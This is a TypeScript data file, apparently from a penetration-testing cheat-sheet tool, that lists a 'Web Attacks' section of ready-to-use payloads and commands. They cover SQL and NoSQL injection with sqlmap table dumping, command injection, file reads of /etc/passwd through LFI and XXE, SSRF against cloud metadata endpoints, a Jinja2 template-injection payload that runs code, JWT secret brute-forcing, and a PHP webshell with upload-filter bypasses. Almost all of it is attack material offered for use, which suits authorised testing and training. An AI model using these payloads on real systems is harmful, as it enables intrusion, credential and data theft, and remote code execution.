import { Section } from "./types";

export const webSection: Section = {
  id: "web",
  title: "Web Attacks",
  slug: "web",
  groups: [
    { title: "SQL Injection Manual", commands: [
      { id: "web-1", cmd: "' OR 1=1-- -", description: "Boolean bypass payload.", tags: ["web"] },
      { id: "web-2", cmd: "' UNION SELECT null,null-- -", description: "Union column test.", tags: ["web"] },
      { id: "web-2a", cmd: "' ORDER BY 3-- -", description: "Find SQLi column count.", tags: ["web"] },
      { id: "web-2b", cmd: "' UNION SELECT database(),user()-- -", description: "Extract DB and user context.", tags: ["web"] },
    ]},
    { title: "SQLMap", commands: [
      { id: "web-3", cmd: "sqlmap -u '{URL}/page.php?id=1' --batch --dbs", description: "Detect and enumerate DBs.", tags: ["web"], hasVars: true },
      { id: "web-3a", cmd: "sqlmap -u '{URL}/page.php?id=1' --batch --tables -D {DB}", description: "List tables in target DB.", tags: ["web"], hasVars: true },
      { id: "web-3b", cmd: "sqlmap -u '{URL}/page.php?id=1' --batch --dump -D {DB} -T {TABLE}", description: "Dump table rows.", tags: ["web"], hasVars: true },
      { id: "web-3c", cmd: "sqlmap -r request.txt --batch --risk=3 --level=5", description: "Run SQLmap from raw request.", tags: ["web"] },
    ]},
    { title: "Command Injection", commands: [
      { id: "web-4", cmd: "127.0.0.1; id", description: "Linux command injection probe.", tags: ["web", "linux"] },
      { id: "web-4a", cmd: "127.0.0.1 && whoami", description: "AND operator probe.", tags: ["web"] },
      { id: "web-4b", cmd: "127.0.0.1 | whoami", description: "Pipe operator probe.", tags: ["web"] },
    ]},
    { title: "LFI/RFI", commands: [
      { id: "web-5", cmd: "{URL}/index.php?page=../../../../etc/passwd", description: "LFI file read test.", tags: ["web"], hasVars: true },
      { id: "web-5a", cmd: "{URL}/index.php?page=php://filter/convert.base64-encode/resource=index.php", description: "Read source through php filter.", tags: ["web"], hasVars: true },
      { id: "web-5b", cmd: "{URL}/index.php?page=../../../../proc/self/environ", description: "Check environ for log poisoning path.", tags: ["web"], hasVars: true },
    ]},
    { title: "XSS", commands: [
      { id: "web-6", cmd: "<script>alert(1)</script>", description: "Basic reflected XSS probe.", tags: ["web"] },
      { id: "web-6a", cmd: "\"><svg/onload=alert(1)>", description: "Attribute-breakout XSS payload.", tags: ["web"] },
      { id: "web-6b", cmd: "<img src=x onerror=alert(document.domain)>", description: "Image error-handler XSS payload.", tags: ["web"] },
    ]},
    { title: "SSRF", commands: [
      { id: "web-7", cmd: "{URL}/fetch?url=http://127.0.0.1:80", description: "Localhost SSRF probe.", tags: ["web"], hasVars: true },
      { id: "web-7a", cmd: "{URL}/fetch?url=http://169.254.169.254/latest/meta-data/", description: "Cloud metadata SSRF probe.", tags: ["web"], hasVars: true },
      { id: "web-7b", cmd: "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u '{URL}/fetch?url=http://127.0.0.1/FUZZ'", description: "SSRF internal path fuzzing.", tags: ["web"], hasVars: true },
    ]},
    { title: "SSTI", commands: [
      { id: "web-8", cmd: "{{7*7}}", description: "Generic SSTI arithmetic probe.", tags: ["web"] },
      { id: "web-8a", cmd: "${7*7}", description: "Expression language probe.", tags: ["web"] },
      { id: "web-8b", cmd: "{{config.items()}}", description: "Flask/Jinja info disclosure probe.", tags: ["web"] },
      { id: "web-8c", cmd: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", description: "Jinja2 RCE payload.", tags: ["web", "linux"] },
    ]},
    { title: "XXE", commands: [
      { id: "web-9", cmd: "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>&xxe;</root>", description: "Classic file-read XXE payload.", tags: ["web", "linux"] },
      { id: "web-9a", cmd: "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]><root>&xxe;</root>", description: "XXE with php filter wrapper.", tags: ["web"] },
      { id: "web-9b", cmd: "python3 -m http.server 80", description: "Host external DTD server.", tags: ["web", "all"] },
    ]},
    { title: "JWT", commands: [
      { id: "web-10", cmd: "jwt-tool {JWT} -S hs256 -d wordlist.txt", description: "Bruteforce HS256 secret.", tags: ["web"], hasVars: true },
      { id: "web-10a", cmd: "jwt-tool {JWT} -X a", description: "Test alg confusion/none style attacks.", tags: ["web"], hasVars: true },
      { id: "web-10b", cmd: "python3 -c \"import jwt; print(jwt.decode('{JWT}', options={'verify_signature': False}))\"", description: "Decode JWT without signature check.", tags: ["web"], hasVars: true },
    ]},
    { title: "NoSQL Injection", commands: [
      { id: "web-11", cmd: "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", description: "NoSQL auth bypass payload.", tags: ["web"] },
      { id: "web-11a", cmd: "admin' || '1'=='1", description: "NoSQL string-based bypass test.", tags: ["web"] },
      { id: "web-11b", cmd: "{\"$where\":\"sleep(5000)\"}", description: "NoSQL timing payload.", tags: ["web"] },
    ]},
    { title: "File Upload Abuse", commands: [
      { id: "web-12", cmd: "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php", description: "Create simple PHP webshell.", tags: ["web"] },
      { id: "web-12a", cmd: "cp shell.php shell.php.jpg", description: "Double-extension upload bypass.", tags: ["web"] },
      { id: "web-12b", cmd: "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg", description: "Inject payload in metadata.", tags: ["web"] },
    ]},
    {
      title: "External References (Local Exports)",
      commands: [
        { id: "web-ref-web", cmd: "web_2026-03-29.txt", description: "Local reference export (HackTricks web notes). Open the file locally; not a runnable command.", tags: ["all"] },
      ],
    },
  ],
};
